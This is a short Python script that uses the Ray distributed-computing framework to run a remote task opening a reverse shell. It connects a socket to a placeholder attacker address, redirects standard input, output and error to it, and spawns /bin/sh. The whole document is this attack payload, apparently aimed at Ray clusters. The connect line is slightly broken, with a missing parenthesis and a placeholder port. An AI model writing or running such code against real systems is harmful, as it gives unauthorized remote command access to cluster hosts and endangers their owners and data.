import ray
import os

ray.init()

@ray.remote
def reverse_shell():
    import socket
    import os
    import pty
    
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(("x.x.x.x", x00x)
    os.dup2(s.fileno(), 0)
    os.dup2(s.fileno(), 1)
    os.dup2(s.fileno(), 2)
    pty.spawn("/bin/sh")

# Execute the reverse shell function as a Ray task
future = reverse_shell.remote()
result = ray.get(future)

print("Reverse shell task executed")
